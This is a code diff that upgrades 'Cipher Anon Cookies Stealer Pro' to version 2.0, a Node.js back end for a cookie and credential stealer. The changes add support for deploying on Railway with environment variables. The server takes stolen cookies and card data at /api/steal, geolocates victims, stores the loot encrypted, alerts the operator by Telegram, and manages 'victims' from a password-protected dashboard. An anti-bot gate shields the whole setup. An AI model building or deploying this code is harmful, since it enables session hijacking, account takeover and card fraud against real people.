@@ -1,6 +1,6 @@
 // ============================================================
-// SERVER.JS — Cipher Anon Cookies Stealer Pro
-// Dedup: IP + hostname, 60s window
+// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
+// Railway Ready — Full Environment Variable Support
 // ============================================================
 
 const express = require('express');
@@ -11,77 +11,106 @@ const crypto = require('crypto');
 const axios = require('axios');
 const session = require('express-session');
 
+// Import Anti-Bot (make sure anti-bot.js exists in the same folder)
 const { antiBot, handleVerify } = require('./anti-bot.js');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// ============================================================
+// CONFIGURATION — Railway Friendly (Env Vars First)
+// ============================================================
+
 const CONFIG_FILE = path.join(__dirname, 'config.json');
-
-function loadConfig() {
-    if (fs.existsSync(CONFIG_FILE)) {
-        try { return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); } catch { return null; }
-    }
-    return null;
-}
-
-function saveConfig(cfg) {
-    fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2));
-}
 
 function generateValidKey() {
     return crypto.randomBytes(32).toString('hex');
 }
 
-function isValidHexKey(key) {
-    return typeof key === 'string' && key.length === 64 && /^[a-f0-9]{64}$/i.test(key);
-}
-
-let config = loadConfig();
-
-if (!config || !config.ENCRYPTION_KEY || !isValidHexKey(config.ENCRYPTION_KEY)) {
-    const newKey = generateValidKey();
-    console.log(`[!] Generated new key: ${newKey}`);
-    config = {
-        DASHBOARD_USERNAME: 'admin',
-        DASHBOARD_PASSWORD: 'SecurePass123',
-        ENCRYPTION_KEY: newKey,
-        TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN',
-        TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID',
-        SEND_NOTIFICATIONS: true,
+// Load config: env vars override config.json
+function loadConfig() {
+    // Environment variables take priority
+    const envConfig = {
+        DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME || 'admin',
+        DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD || 'SecurePass123',
+        ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || generateValidKey(),
+        TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
+        TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID',
+        SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
     };
-    saveConfig(config);
-} else {
-    if (!config.DASHBOARD_USERNAME) config.DASHBOARD_USERNAME = 'admin';
-    if (!config.DASHBOARD_PASSWORD) config.DASHBOARD_PASSWORD = 'SecurePass123';
-    if (!config.TELEGRAM_BOT_TOKEN) config.TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
-    if (!config.TELEGRAM_CHAT_ID) config.TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
-    if (config.SEND_NOTIFICATIONS === undefined) config.SEND_NOTIFICATIONS = true;
-    saveConfig(config);
+
+    // Try to read config.json for persistence
+    let fileConfig = {};
+    if (fs.existsSync(CONFIG_FILE)) {
+        try {
+            fileConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
+            console.log('[+] Loaded config from file');
+        } catch (e) {
+            console.log('[!] Config file corrupt, using env vars');
+        }
+    }
+
+    // Merge: env vars override file
+    const merged = { ...fileConfig, ...envConfig };
+
+    // Validate encryption key
+    const key = merged.ENCRYPTION_KEY;
+    if (typeof key !== 'string' || key.length !== 64 || !/^[a-f0-9]{64}$/i.test(key)) {
+        console.log('[!] Invalid encryption key — generating new one');
+        merged.ENCRYPTION_KEY = generateValidKey();
+    }
+
+    // Save merged config back to file
+    try {
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2));
+    } catch (e) {
+        console.log('[!] Config file not writable — using env vars only');
+    }
+
+    return merged;
 }
 
-const CONFIG = config;
+const CONFIG = loadConfig();
+
+// Log config (hide sensitive data)
+console.log(`[+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
+console.log(`[+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
+console.log(`[+] Encryption Key: ${CONFIG.ENCRYPTION_KEY.slice(0,8)}...`);
+console.log(`[+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED' : 'DISABLED'}`);
+
+// ============================================================
+// DATA FILES
+// ============================================================
 
 const DATA_FILE = path.join(__dirname, 'stolen.enc');
 const TRASH_FILE = path.join(__dirname, 'trash.enc');
 const LOG_FILE = path.join(__dirname, 'steal.log');
 
-// SESSION
-const SESSION_SECRET = crypto.randomBytes(32).toString('hex');
-const SESSION_MAX_AGE = 30 * 60 * 1000;
+// ============================================================
+// SESSION SETUP
+// ============================================================
+
+const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
+const SESSION_MAX_AGE = 30 * 60 * 1000; // 30 minutes
 
 app.use(session({
     secret: SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
-    cookie: { secure: false, maxAge: SESSION_MAX_AGE, httpOnly: true, sameSite: 'lax' }
+    cookie: {
+        secure: false, // Railway uses HTTPS but this works
+        maxAge: SESSION_MAX_AGE,
+        httpOnly: true,
+        sameSite: 'lax'
+    }
 }));
 
+// Session activity check
 app.use((req, res, next) => {
     if (req.session && req.session.authenticated) {
         const now = Date.now();
-        const last = req.session.lastActivity || now;
-        if (now - last > SESSION_MAX_AGE) {
+        const lastActivity = req.session.lastActivity || now;
+        if (now - lastActivity > SESSION_MAX_AGE) {
             req.session.destroy(() => {
                 if (req.path.startsWith('/api')) {
                     return res.status(401).json({ status: 'error', message: 'Session expired' });
@@ -95,7 +124,10 @@ app.use((req, res, next) => {
     next();
 });
 
-// ENCRYPTION
+// ============================================================
+// ENCRYPTION ENGINE
+// ============================================================
+
 function encryptData(data) {
     const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
     const iv = crypto.randomBytes(16);
@@ -116,7 +148,10 @@ function decryptData(encryptedBase64) {
         decipher.setAuthTag(tag);
         const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
         return JSON.parse(decrypted.toString());
-    } catch { return null; }
+    } catch (e) {
+        console.log('[!] Decryption failed:', e.message);
+        return null;
+    }
 }
 
 function saveData(file, data) {
@@ -125,14 +160,22 @@ function saveData(file, data) {
 
 function loadData(file) {
     if (!fs.existsSync(file)) return [];
-    try { return decryptData(fs.readFileSync(file, 'utf8')) || []; }
-    catch { return []; }
+    try {
+        const decrypted = decryptData(fs.readFileSync(file, 'utf8'));
+        return decrypted || [];
+    } catch (e) {
+        console.log(`[!] Failed to load ${file}:`, e.message);
+        return [];
+    }
 }
 
 let stolenData = loadData(DATA_FILE);
 let trashData = loadData(TRASH_FILE);
 
-// DEDUP: IP + hostname, 60s
+// ============================================================
+// DEDUP: IP + hostname, 60s window
+// ============================================================
+
 const dedupCache = new Map();
 const DEDUP_WINDOW = 60000;
 
@@ -155,33 +198,47 @@ function isDuplicate(ip, hostname) {
     return false;
 }
 
+// ============================================================
+// LOGGING
+// ============================================================
+
 function log(msg) {
     const entry = `[${new Date().toISOString()}] ${msg}`;
     console.log(entry);
-    try { fs.appendFileSync(LOG_FILE, entry + '\n'); } catch {}
+    try { fs.appendFileSync(LOG_FILE, entry + '\n'); } catch (e) {}
 }
 
-// AUTH
+// ============================================================
+// AUTH MIDDLEWARE
+// ============================================================
+
 function requireAuth(req, res, next) {
-    if (req.session && req.session.authenticated === true) return next();
+    if (req.session && req.session.authenticated === true) {
+        return next();
+    }
     if (req.path.startsWith('/api')) {
-        return res.status(401).json({ status: 'error', message: 'Unauthorized' });
+        return res.status(401).json({ status: 'error', message: 'Unauthorized - Please login' });
     }
     res.redirect('/login.php');
 }
 
-// SERVER
+// ============================================================
+// SERVER SETUP
+// ============================================================
+
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
+// ---- ANTI-BOT (with IP whitelist disabled for public access) ----
 app.use(antiBot({
     STRENGTH: 'high',
     RATE_LIMIT_MAX: 10,
-    ALLOWED_IPS: ['127.0.0.1', '::1', '::ffff:127.0.0.1']
+    ALLOWED_IPS: [] // Empty = no IP whitelist, everyone gets challenged
 }));
 
 app.post('/__verify', express.json(), handleVerify);
 
+// ---- SECURITY HEADERS ----
 app.use((req, res, next) => {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
@@ -190,20 +247,24 @@ app.use((req, res, next) => {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
     res.setHeader('Pragma', 'no-cache');
     res.setHeader('Expires', '0');
-    if (req.path.endsWith('.html')) return res.status(404).send('Not Found');
+
+    if (req.path.endsWith('.html')) {
+        return res.status(404).send('Not Found');
+    }
     next();
 });
 
+// ---- Serve .php files from public folder ----
 app.get('*.php', (req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
     if (fs.existsSync(filePath)) {
         res.setHeader('Content-Type', 'text/html; charset=utf-8');
         res.sendFile(filePath);
     } else {
-        const base = filePath.replace(/\.php$/, '');
-        if (fs.existsSync(base)) {
+        const basePath = filePath.replace(/\.php$/, '');
+        if (fs.existsSync(basePath)) {
             res.setHeader('Content-Type', 'text/html; charset=utf-8');
-            res.sendFile(base);
+            res.sendFile(basePath);
         } else {
             next();
         }
@@ -213,18 +274,25 @@ app.get('*.php', (req, res, next) => {
 app.use(express.static('public', {
     index: false,
     setHeaders: (res, filePath) => {
-        if (filePath.endsWith('.html')) return res.status(404).send('Not Found');
-        if (filePath.endsWith('.php')) res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        if (filePath.endsWith('.html')) {
+            return res.status(404).send('Not Found');
+        }
+        if (filePath.endsWith('.php')) {
+            res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        }
         res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
     }
 }));
 
+// ---- Routes ----
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
 
 app.get('/login.php', (req, res) => {
-    if (req.session && req.session.authenticated) return res.redirect('/dashboard');
+    if (req.session && req.session.authenticated) {
+        return res.redirect('/dashboard');
+    }
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'login.php'));
 });
@@ -241,11 +309,14 @@ app.get('/password-success.php', (req, res) => {
     }
 });
 
+// ---- Login API ----
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
+
     if (!username || !password) {
         return res.status(400).json({ status: 'error', message: 'Username and password required' });
     }
+
     if (username === CONFIG.DASHBOARD_USERNAME && password === CONFIG.DASHBOARD_PASSWORD) {
         req.session.authenticated = true;
         req.session.username = username;
@@ -254,27 +325,34 @@ app.post('/api/login', (req, res) => {
         log(`[+] User logged in: ${username}`);
         return res.json({ status: 'ok', message: 'Login successful' });
     }
-    log(`[!] Failed login: ${username}`);
+
+    log(`[!] Failed login attempt: ${username}`);
     res.status(401).json({ status: 'error', message: 'Invalid username or password' });
 });
 
+// ---- Logout ----
 app.get('/api/logout', (req, res) => {
     req.session.destroy((err) => {
         if (err) log(`[!] Logout error: ${err.message}`);
         res.clearCookie('connect.sid');
-        log('[+] User logged out');
+        log('[+] User logged out, session destroyed');
         res.redirect('/login.php');
     });
 });
 
+// ---- Protected Dashboard ----
 app.get('/dashboard', requireAuth, (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
 });
 
+// ---- Protected API ----
 app.use('/api/*', requireAuth);
 
+// ============================================================
 // GEOLOCATION
+// ============================================================
+
 async function getCountryInfo(ip) {
     try {
         const response = await axios.get('http://ip-api.com/json/' + ip, { timeout: 5000 });
@@ -297,12 +375,15 @@ async function getCountryInfo(ip) {
     }
 }
 
+// ============================================================
 // TELEGRAM
+// ============================================================
+
 async function sendTelegram(host, count, ip, countryInfo, credCount, cardCount) {
     if (!CONFIG.SEND_NOTIFICATIONS) return;
     const t = CONFIG.TELEGRAM_BOT_TOKEN;
     const c = CONFIG.TELEGRAM_CHAT_ID;
-    if (!t || t === 'YOUR_BOT_TOKEN') return;
+    if (!t || t === 'YOUR_BOT_TOKEN' || t === '') return;
 
     const flag = countryInfo?.countryCode ? getFlagEmoji(countryInfo.countryCode) : '🌍';
     const countryName = countryInfo?.country || 'Unknown';
@@ -325,7 +406,7 @@ ${flag} *Country:* ${countryName}
 📡 *ISP:* ${isp}
 🕐 *Time:* ${time}
 
-📊 *Dashboard:* http://localhost:${PORT}/dashboard`;
+📊 *Dashboard:* ${process.env.DASHBOARD_URL || 'http://localhost:' + PORT}/dashboard`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${t}/sendMessage`, {
@@ -345,6 +426,10 @@ function getFlagEmoji(countryCode) {
     return String.fromCodePoint(...codePoints);
 }
 
+// ============================================================
+// GENERATE UNIQUE ID
+// ============================================================
+
 function generateUniqueId(entry) {
     const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
     const ip = entry.ip || 'unknown';
@@ -352,12 +437,19 @@ function generateUniqueId(entry) {
     return crypto.createHash('md5').update(`${time}|${ip}|${domain}`).digest('hex');
 }
 
+// ============================================================
 // API ROUTES
+// ============================================================
+
+// ---- STEAL COOKIES ----
 app.post('/api/steal', async (req, res) => {
     try {
         const data = req.body;
         let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-        if (ip === '::1' || ip === '::ffff:127.0.0.1') ip = '127.0.0.1';
+
+        if (ip === '::1' || ip === '::ffff:127.0.0.1') {
+            ip = '127.0.0.1';
+        }
 
         const countryInfo = await getCountryInfo(ip);
 
@@ -373,6 +465,7 @@ app.post('/api/steal', async (req, res) => {
 
         const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
 
+        // Dedup check
         cleanDedup();
         if (isDuplicate(ip, hostname)) {
             log(`[!] Duplicate from ${ip} for ${hostname} — ignored`);
@@ -392,30 +485,35 @@ app.post('/api/steal', async (req, res) => {
 
         res.json({ status: 'ok', country: countryInfo });
     } catch (e) {
-        log(`[!] Error: ${e.message}`);
-        res.status(500).json({ status: 'error' });
+        log(`[!] Error in /api/steal: ${e.message}`);
+        res.status(500).json({ status: 'error', message: e.message });
     }
 });
 
+// ---- GET ALL DATA ----
 app.get('/api/data', (req, res) => {
     const clean = stolenData.map(({ _dedupKey, ...rest }) => rest);
     res.json(clean);
 });
 
+// ---- GET TRASH DATA ----
 app.get('/api/trash', (req, res) => {
     const clean = trashData.map(({ _dedupKey, ...rest }) => rest);
     res.json(clean);
 });
 
+// ---- MOVE TO TRASH ----
 app.delete('/api/delete/:uniqueId', (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
-        return res.status(400).json({ status: 'error', message: 'Invalid ID' });
+        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
     }
-    const idx = stolenData.findIndex(e => e._uniqueId === uid);
-    if (idx === -1) return res.status(404).json({ status: 'error', message: 'Not found' });
+    const index = stolenData.findIndex(entry => entry._uniqueId === uid);
+    if (index === -1) {
+        return res.status(404).json({ status: 'error', message: 'Victim not found' });
+    }
     try {
-        const removed = stolenData.splice(idx, 1)[0];
+        const removed = stolenData.splice(index, 1)[0];
         removed.deletedAt = new Date().toISOString();
         trashData.push(removed);
         saveData(DATA_FILE, stolenData);
@@ -428,36 +526,42 @@ app.delete('/api/delete/:uniqueId', (req, res) => {
     }
 });
 
+// ---- RESTORE FROM TRASH ----
 app.post('/api/restore/:uniqueId', (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
-        return res.status(400).json({ status: 'error', message: 'Invalid ID' });
+        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
     }
-    const idx = trashData.findIndex(e => e._uniqueId === uid);
-    if (idx === -1) return res.status(404).json({ status: 'error', message: 'Not found in trash' });
+    const index = trashData.findIndex(entry => entry._uniqueId === uid);
+    if (index === -1) {
+        return res.status(404).json({ status: 'error', message: 'Victim not found in trash' });
+    }
     try {
-        const restored = trashData.splice(idx, 1)[0];
+        const restored = trashData.splice(index, 1)[0];
         delete restored.deletedAt;
         stolenData.push(restored);
         saveData(DATA_FILE, stolenData);
         saveData(TRASH_FILE, trashData);
-        log(`[+] Restored: ${restored?.fingerprint?.hostname || restored?.domain || 'unknown'}`);
-        res.json({ status: 'ok', restored });
+        log(`[+] Restored from trash: ${restored?.fingerprint?.hostname || restored?.domain || 'unknown'}`);
+        res.json({ status: 'ok', restored: restored });
     } catch (e) {
         log(`[!] Error: ${e.message}`);
         res.status(500).json({ status: 'error', message: e.message });
     }
 });
 
+// ---- PERMANENTLY DELETE ----
 app.delete('/api/trash/permanent/:uniqueId', (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
-        return res.status(400).json({ status: 'error', message: 'Invalid ID' });
+        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
     }
-    const idx = trashData.findIndex(e => e._uniqueId === uid);
-    if (idx === -1) return res.status(404).json({ status: 'error', message: 'Not found in trash' });
+    const index = trashData.findIndex(entry => entry._uniqueId === uid);
+    if (index === -1) {
+        return res.status(404).json({ status: 'error', message: 'Victim not found in trash' });
+    }
     try {
-        const removed = trashData.splice(idx, 1)[0];
+        const removed = trashData.splice(index, 1)[0];
         saveData(TRASH_FILE, trashData);
         log(`[+] Permanently deleted: ${removed?.fingerprint?.hostname || removed?.domain || 'unknown'}`);
         res.json({ status: 'ok', permanentlyDeleted: removed });
@@ -467,19 +571,21 @@ app.delete('/api/trash/permanent/:uniqueId', (req, res) => {
     }
 });
 
+// ---- EMPTY TRASH ----
 app.delete('/api/trash/empty', (req, res) => {
     try {
         const count = trashData.length;
         trashData = [];
         saveData(TRASH_FILE, trashData);
         log(`[+] Emptied trash: ${count} victims`);
-        res.json({ status: 'ok', count });
+        res.json({ status: 'ok', count: count });
     } catch (e) {
         log(`[!] Error: ${e.message}`);
         res.status(500).json({ status: 'error', message: e.message });
     }
 });
 
+// ---- CLEAR ALL DATA ----
 app.delete('/api/clear', (req, res) => {
     try {
         stolenData = [];
@@ -491,27 +597,43 @@ app.delete('/api/clear', (req, res) => {
     }
 });
 
+// ---- CHANGE PASSWORD ----
 app.post('/api/change-password', (req, res) => {
     const { oldPassword, newPassword } = req.body;
+
     if (!oldPassword || !newPassword) {
         return res.status(400).json({ status: 'error', message: 'Old and new password required' });
     }
+
     if (newPassword.length < 4) {
         return res.status(400).json({ status: 'error', message: 'New password must be at least 4 characters' });
     }
+
     if (oldPassword !== CONFIG.DASHBOARD_PASSWORD) {
         return res.status(401).json({ status: 'error', message: 'Current password is incorrect' });
     }
+
     CONFIG.DASHBOARD_PASSWORD = newPassword;
-    saveConfig(CONFIG);
-    log('[+] Password changed');
+    // Save to config.json
+    try {
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
+    } catch (e) {
+        log(`[!] Failed to save config: ${e.message}`);
+    }
+    log('[+] Password changed successfully');
+
     req.session.destroy((err) => {
         if (err) log(`[!] Session destroy error: ${err.message}`);
         res.clearCookie('connect.sid');
-        res.json({ status: 'ok', message: 'Password updated', redirect: '/password-success.php' });
+        res.json({
+            status: 'ok',
+            message: 'Password updated successfully',
+            redirect: '/password-success.php'
+        });
     });
 });
 
+// ---- GET TELEGRAM CONFIG ----
 app.get('/api/config/telegram', (req, res) => {
     res.json({
         botToken: CONFIG.TELEGRAM_BOT_TOKEN || '',
@@ -520,31 +642,69 @@ app.get('/api/config/telegram', (req, res) => {
     });
 });
 
+// ---- UPDATE TELEGRAM CONFIG ----
 app.post('/api/config/telegram', (req, res) => {
     const { botToken, chatId, notifications } = req.body;
+
     if (!botToken || !chatId) {
-        return res.status(400).json({ status: 'error', message: 'Bot token and chat ID required' });
+        return res.status(400).json({
+            status: 'error',
+            message: 'Bot token and chat ID are required'
+        });
     }
+
     CONFIG.TELEGRAM_BOT_TOKEN = botToken;
     CONFIG.TELEGRAM_CHAT_ID = chatId;
     CONFIG.SEND_NOTIFICATIONS = notifications !== undefined ? notifications : true;
-    saveConfig(CONFIG);
-    log(`[+] Telegram config updated`);
-    res.json({ status: 'ok', message: 'Telegram settings updated' });
+
+    // Save to config.json
+    try {
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
+    } catch (e) {
+        log(`[!] Failed to save config: ${e.message}`);
+    }
+
+    log('[+] Telegram config updated');
+    res.json({ status: 'ok', message: 'Telegram settings updated successfully' });
 });
+
+// ============================================================
+// START SERVER
+// ============================================================
 
 app.listen(PORT, () => {
     console.log('\n' + '='.repeat(55));
-    console.log('  🍪 CIPHER ANON COOKIES STEALER PRO');
+    console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.0');
     console.log('='.repeat(55));
     console.log(`  [+] Server: http://localhost:${PORT}`);
     console.log(`  [+] Login: http://localhost:${PORT}/login.php`);
     console.log(`  [+] Home: http://localhost:${PORT}/home.php`);
     console.log(`  [+] Dashboard: http://localhost:${PORT}/dashboard`);
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
-    console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD}`);
-    console.log(`  [+] Dedup: IP + hostname, 60s`);
+    console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
+    console.log(`  [+] Session Timeout: 30 minutes`);
+    console.log(`  [+] Dedup: IP + hostname, 60s window`);
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log('='.repeat(55) + '\n');
 });
+
+// ============================================================
+// GRACEFUL SHUTDOWN — Save data on exit
+// ============================================================
+
+process.on('SIGINT', () => {
+    console.log('\n[!] Received SIGINT. Saving data...');
+    saveData(DATA_FILE, stolenData);
+    saveData(TRASH_FILE, trashData);
+    process.exit(0);
+});
+
+process.on('SIGTERM', () => {
+    console.log('\n[!] Received SIGTERM. Saving data...');
+    saveData(DATA_FILE, stolenData);
+    saveData(TRASH_FILE, trashData);
+    process.exit(0);
+});
+
+module.exports = app;
